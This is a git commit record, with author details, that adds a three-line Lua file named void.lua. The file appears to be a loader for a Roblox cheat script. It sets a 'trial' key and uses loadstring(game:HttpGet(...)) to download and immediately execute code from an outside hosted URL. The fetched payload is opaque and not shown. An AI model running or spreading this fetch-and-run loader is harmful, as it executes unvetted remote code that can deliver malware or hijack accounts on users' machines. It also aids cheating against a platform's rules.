33f1c47d9629f25ebc7eaea94b2ef779a1fda1c8
kfclover67 <kamilpc2012@gmail.com>
2026-08-09 13:15:56 +0200

    Create void.lua with script loading functionality
    Add void.lua script with trial key and loadstring execution.

---
+++ void.lua
@@ -0,0 +1,3 @@
+-- i know u skid lol
+script_key = "trial"
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/ab39f41a6f7c0495ec22f523d52fce2b7a1b94c2e14d9fbca36905f930ea8ff0.lua"))()
